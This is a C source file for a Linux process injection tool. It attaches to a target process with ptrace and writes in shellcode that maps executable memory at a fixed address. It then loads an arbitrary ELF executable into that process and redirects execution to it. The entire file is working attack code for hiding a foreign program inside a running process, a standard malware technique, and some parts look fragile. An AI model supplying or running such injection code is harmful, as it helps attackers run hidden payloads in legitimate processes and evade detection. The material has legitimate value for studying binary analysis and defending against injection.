#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <elf.h>
#include <sys/mman.h>
#include <syscall.h>
#include <sys/stat.h>
#include <signal.h>

#include "ptrace_interface.h"
#include <asm/ptrace.h>
static inline volatile void *evil_mmap(void *addr, size_t length, int prot, int flags,
                              int fd, off_t offset)
{
    long mmap_fd = fd;
    unsigned long mmap_off = offset;
    unsigned int mmap_flags = flags;
    unsigned long ret;
    __asm__ volatile("mov %0, %%rdi\n"
            "mov %1,%%rsi\n"
            "mov %2,%%rdx\n"
            "mov %3,%%r10\n"
            "mov %4,%%r8\n"
            "mov %5,%%r9\n"
            "mov %6,%%rax\n"
            "syscall\n":: "g"(addr), "g"(length), "g"(prot), "g"(flags), "g"(mmap_fd), "g"(mmap_off), "g"(SYS_mmap));
    __asm__ volatile("mov %%rax, %0\n": "=r"(ret));
    return (void *)ret;
}
uint64_t injection_code(void *vaddr)
{
    volatile void *mem;
    mem = evil_mmap(vaddr, 8192, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, 1, 0);
    asm volatile("int3");
}
uint8_t *create_fn_shellcode(void (*fn)(), size_t len)
{
    size_t i;
    uint8_t *shellcode = (uint8_t *)malloc(len);
    uint8_t *p = (uint8_t *)fn;
    for (i = 0; i < len; i++)
        *(shellcode + i) = *p++;
    return shellcode;
}
#define BASE_ADDRESS    0x100000
#define WORD_ALIGN(x)   ((x+7) & ~7)
void *f1 = injection_code;
void *f2 = create_fn_shellcode;
int main(int argc, char **argv)
{
    pid_t pid;
    char *exec_path;
    Elf64_Addr base_addr;
    unsigned long shellcode_size = f2 - f1;
    uint8_t *shellcode, *executable, *origcode;
    struct pt_regs pt_reg;
    struct stat st;
    int status, fd;
    Elf64_Ehdr *ehdr;

    if (argc < 3) {
        printf("Usage: %s <pid> <excutable>\n", argv[0]);
        exit(-1);
    }

    pid = atoi(argv[1]);
    exec_path = strdup(argv[2]);

    if (ptrace_attach(pid) < 0) {
        printf("failed to attach %d\n", pid);
        exit(-1);
    }

    base_addr = get_mem_base(pid);
    shellcode_size += 8;
    printf("shellcode_size :%lx\n", shellcode_size);

    shellcode = create_fn_shellcode((void *)&injection_code, shellcode_size);

    origcode = alloca(shellcode_size);

    ptrace_read((void *)origcode, shellcode_size, (void *)base_addr, pid);

    ptrace_write((void *)shellcode, shellcode_size, (void *)base_addr, pid);

    ptrace(PTRACE_GETREGS, pid, NULL, &pt_reg);
    pt_reg.rip = base_addr;
    pt_reg.rdi = BASE_ADDRESS;

    ptrace(PTRACE_SETREGS, pid, NULL, &pt_reg);

    ptrace(PTRACE_CONT, pid, NULL, NULL);

    wait(&status);

    if (WSTOPSIG(status) != SIGTRAP) {
        printf("someting went wrong\n");
        exit(-1);
    }

    ptrace_write((void *)origcode, shellcode_size, (void *)base_addr, pid);

    fd = open(exec_path, O_RDONLY);
    fstat(fd, &st);

    executable = malloc(WORD_ALIGN(st.st_size));

    read(fd, executable, st.st_size);
    close(fd);

    ehdr = (Elf64_Ehdr *)executable;

    ptrace_write(executable, st.st_size, (void *)BASE_ADDRESS, pid);
    ptrace(PTRACE_GETREGS, pid, NULL, &pt_reg);
    pt_reg.rip = BASE_ADDRESS + ehdr->e_entry;

    ptrace(PTRACE_SETREGS, pid, NULL, &pt_reg);

    //ptrace(PTRACE_CONT, pid, NULL, NULL);
    ptrace_detach(pid);

    wait(&status);
    
	return 0;
}
